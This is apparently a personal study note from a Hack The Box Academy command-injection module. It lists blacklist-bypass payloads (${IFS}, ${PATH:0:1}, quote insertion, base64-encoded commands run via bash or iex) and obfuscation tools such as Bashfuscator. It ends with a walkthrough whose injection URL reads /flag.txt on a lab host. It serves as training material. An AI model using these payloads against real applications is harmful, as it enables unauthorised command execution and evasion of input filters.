---
created: 2025-05-05
published: 2025-05-07
lastmod: 2025-05-07
tags:
- learning
- command injection
image: /static/note-thumbnails/htb-command-injections.png
description: Throughout this module, I learned different techniques for identifying and exploiting command injection vulnerabilities in web applications and applying various techniques to bypass filters and security mitigations.
---

<img src="/static/note-thumbnails/htb-command-injections.png" alt="htb command injections logo" style="max-width: 450px; height: auto; display: block; margin: 0 auto; box-shadow: 0px 0px 14px 0px rgba(0,0,0,0.9);">

Time to complete: ~4 hours

https://academy.hackthebox.com/achievement/402127/109

[PayloadsAllTheThings command injection reference](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion)

>[!code]- Command escape characters
>All of these operators (except the semi-colon for Windows command Line) can be used **regardless of the web application language, framework, or back-end server!**
>
>![[Images/Pasted image 20250505070004.png]]
###### Bypassing blacklisted characters

>[!code]- Space character
>###### Linux
>```powershell
>%09 # TAB
>
>${IFS} # a variable whose default value is a space and a tab
>
>{ls,-la} # Bash bracket expansion, which automatically adds spaces between arguments wrapped between braces
>```
>Others given in the [PayloadsAllTheThings guide](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space).

>[!code]- Using environment variables
>###### Linux
>Print all environment variables using `printenv`.
>```powershell
># Takes the first character of the PATH/PWD/HOME variable, which is often a forward slash
>
>${PATH:0:1} # Forward slash (/)
>${PWD:0:1} # Forward slash (/)
>${HOME:0:1} # Forward slash (/)
>
># Takes the 10th character from the LS_COLORS variable, which is often a semi-colon
>
>${LS_COLORS:10:1} # Semi-colon (;)
>```
>###### Windows
>Print all environment variables using `Get-ChildItem Env:`.
>```powershell
># %HOMEPATH% -> \Users\htb-student
># Output character at 6th starting position and ending at 11th from end
>
>%HOMEPATH:~6,-11% # Black slash (\) - DOS
>$env:HOMEPATH[0] # Black slash (\) - PowerShell
>```
>
>>[!exploit]- Example (Hack The Box Academy)
>>The vulnerable input:
>>
>>![[Images/Pasted image 20250506062234.png]]
>>
>>The payload:
>>```powershell
>>127.0.0.1%09%0a{ls,-la,${PATH:0:1}home}
>>```
>>
>>Which is interpreted as:
>>```powershell
>>127.0.0.1
>>	ls -la /home
>>```
>>Because `%09` is interpreted as a new-line character, which allows us to inject a new OS command, `%0a` is a space, which is necessary for the second command to be recognised, `{ls,-la}` is interpreted as `ls -la` which allows us to bypass the block on the space character, and `${PATH:0:1}` is interpreted as `/` because `/` is the first character of the victim's PATH variable.
>>
>>![[Images/Pasted image 20250506062129.png]]

>[!code]- ASCII shifting
>First, find the character in the ASCII table that is just before our desired character, then add it instead of `[` in the below example.
>
>![[Images/Pasted image 20250506054537.png]]
>###### Linux
>```powershell
>man ascii     # \ is on 92, before it is [ on 91
>$(tr '!-}' '"-~'<<<[) # this will give us \
>```
###### Bypassing blacklisted commands

>[!code]- Character insertions
>###### Quotes
>```powershell
># Cannot mix types of quotes and we must have an even number of them
>
>w'h'o'am'i -> whoami
>w"h"o"am"i -> whoami
>```
>
>>[!exploit]- Example (Hack The Box Academy)
>>```powershell
>>127.0.0.1%0aw'h'o'am'i
>>```
>>![[Images/Pasted image 20250506064521.png]]
>
>###### Linux only
>```powershell
># Bash will ignore certain characters, including `\` and `$@`
>
>who$@ami -> whoami
>w\ho\am\i -> whoami
>```
>>[!exploit]- Example (Hack The Box Academy)
>>The input field:
>>
>>![[Images/Pasted image 20250506182846.png]]
>>
>>Payload:
>>```powershell
>>127.0.0.1%0a%09{c$@at,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}
>>```
>>Which gets interpreted as:
>>```
>>127.0.0.1
>>	cat /home/1nj3c70r/flag.txt
>>```
>>![[Images/Pasted image 20250506182737.png]]
>>Normally the `cat` command is blacklisted, so using it returns an `Invalid command` response. But, by obsfucating the `cat` command, the input is accepted and we can chain previous character bypasses to read a file on the victim (`flag.txt`).
>
>###### Windows only
>```powershell
># There are also some Windows-only characters which can be inserted in the middle of a command and do not affect the result, like the carat `^` character
>
>who^ami -> whoami
>```

>[!code]- Case manipulation
>###### Linux
>```powershell
># Linux commands are case sensitive, so we need to find a way of turning a mixed-case or upper-case command into its lower-case variant
>
>$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") # replace all upper case characters with lower case characters
>
>$(a="WhOaMi";printf %s "${a,,}") # same affect, and without a newline character at the end
>$
>```
>###### Windows
>```powershell
># Windows commands are case-insensitive, so it might work to change the case of some/all of the characters in the command
>
>WhOaMi
>```

>[!code]- Reversed commands
>###### Linux
>```powershell
>echo 'whoami' | rev # get the reversed string
>
>$(rev<<<'imaohw') # execute the reversed string
>```
>###### Windows
>```powershell
>"whoami"[-1..-20] -join '' # get the reversed string
>
>iex "$('imaohw'[-1..-20] -join '')" # execute the reversed string
>```

>[!code]- Encoded commands
>###### Linux
>```powershell
># encode the command
>echo -n 'cat /etc/passwd | grep 33' | base64
>
># decode the command
>bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw=) # option 1
>bash -c "$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw=)" # option 2
>```
>
>###### Windows
>```powershell
># Encode the command
>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami')) # on Windows
>echo -n whoami | iconv -f utf-8 -t utf-16le | base64 # on Linux 
>
># Decode then execute the encoded command
>iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
>```
>>[!exploit]- Example (Hack The Box Academy)
>>The vulnerable input:
>>
>>![[Images/Pasted image 20250507055758.png]]
>>
>>The malicious POST payload:
>>```powershell
>>ip=127.0.0.1%0a%09bash%09-c%09"$(base64%09-d%09<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)"
>>```
>>Which decodes to:
>>```powershell
>>ip=127.0.0.1
>>	bash -c "$(base64 -d <<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)"
>>```
>>
>>![[Images/Pasted image 20250507055858.png]]
>>
>>`ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=` is base64 encoded for `find /usr/share/ | grep root | grep mysql | tail -n 1`. This encoded string gets passed to the `base64 -d` command (`<<<`), and then the decoded string is executed by bash (`bash -c "$(...)"`). The injection is afforded via the `%0a` new-line character followed by the `%09` space character.

>[!code]- Alternative commands
>- base64 | openssl
>- bash | sh
###### Auto-evasion tools

>[!code]- Bashfuscator (Linux)
>###### Setup
>```powershell
>git clone https://github.com/Bashfuscator/Bashfuscator
>cd Bashfuscator
>pip3 install setuptools\==65
>python3 setup.py install --user
>
>cd ./bashfuscator/bin/
>```
>
>###### Use
>```powershell
>./bashfuscator -c 'cat /etc/passwd' # randomly pick an obsfucation technique (which could pick a technique that results in an output of over a million characters...)
>
># -s 1 (number of encoding stages)
># -t 1 (technique level - 1 is basic)
># --no-mangling (do not rename variables randomly / preserve readability)
># --layers 1 (apply 1 obsfucation layer)
>./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
>
># Stages = encoding the message multiple times (eg encode 3 times in base64)
># Layers = hiding the message inside multiple envelopes (eg a script inside a script etc)
>```

>[!code]- DOSfunscation (Windows)
>###### Setup
>```powershell
>git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
>cd Invoke-DOSfuscation
>Import-Module .\Invoke-DOSfuscation.psd1
>Invoke-DOSfuscation
>```
>###### Use
>```powershell
>Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
>Invoke-DOSfuscation> encoding
>Invoke-DOSfuscation\Encoding> 1
>```
###### Skills Assessment

>[!info] Task: What is the content of `/flag.txt`?

>[!code]- Authenticate into the H3K Tiny File Manager (credentials provided)
>![[Images/Pasted image 20250507063841.png]]

>[!error]- Find an RCE exploit for Tiny File Manager v2.4.6 - but it requires Admin access
>Find the version of the web app:
>
>![[Images/Pasted image 20250507064841.png]]
>
>Search searchsploit for an exploit:
>
>![[Images/Pasted image 20250507064911.png]]
>
>Find an exploit on [exploit-db](https://www.exploit-db.com/exploits/50828):
>
>![[Images/Pasted image 20250507064945.png]]
>
>The exploit appears to require Admin access because (1) it asks for an admin login:
>
>![[Images/Pasted image 20250507065647.png]]
>
>And (2) it appears to require upload functionality, which I can't see the `guest` user as having:
>
>![[Images/Pasted image 20250507065724.png]]

>[!code]- None the accessible documents appear to have useful content
>They all either contain this:
>
>![[Images/Pasted image 20250507065942.png]] 
>
>And the last one contains this:
>
>![[Images/Pasted image 20250507070004.png]]

>[!code]- Find a potential command injection point (`?to=`)
>One of the options available is `Copy`:
>
>![[Images/Pasted image 20250507070644.png]]
>
>Selecting this, I can move a file between locations:
>
>![[Images/Pasted image 20250507070715.png]]
>
>This operation appears to be submitted via a GET request, where `to=` and `from=` parameters are used to set relative locations:
>
>![[Images/Pasted image 20250507070823.png]]
>
>It's possible this GET command is being interpreted like:
>
>`mv location_a location_b` where location A and B are set by the parameters in the GET request. It might be possible to escape the mv command by doing something like `mv ;<malicious command>`. To do this, the location_a parameter would need to be set to something like `; whoami`.
>
>Changing the `to=` parameter to `;whoami` causes a non-standard response, which suggests I'm on the right track:
>
>![[Images/Pasted image 20250507070601.png]]

>[!code]- Get command injection
>This time I tried injecting the `id` command, but obfucating the command a little by inserting single quotes. This worked:
>
>![[Images/Pasted image 20250507071325.png]]

>[!success]- Get `/flag.txt`
>After some trial and error, I found a working payload to read the contents of `/flag.txt`:
>
>```powershell
>http://94.237.51.163:40913/index.php?to=%3Bc%27a%27t${IFS}${PATH:0:1}flag.txt&from=605311066.txt&finish=1&move=1
>```
>
>The blacklisted characters/commands, and the bypasses I used were:
>- ` ` (space) character 0 -> `${IFS}`
>- `cat` command -> `c'a't`
>- `/` character -> `${PATH:0:1}`
>
>![[Images/Pasted image 20250507074735.png]]

<img src="/static/completed-thumbnails/htb-command-injections.png" alt="htb writeup" style="max-width: 450px; height: auto; display: block; margin: 0 auto; box-shadow: 0px 0px 14px 0px rgba(0,0,0,0.9);">
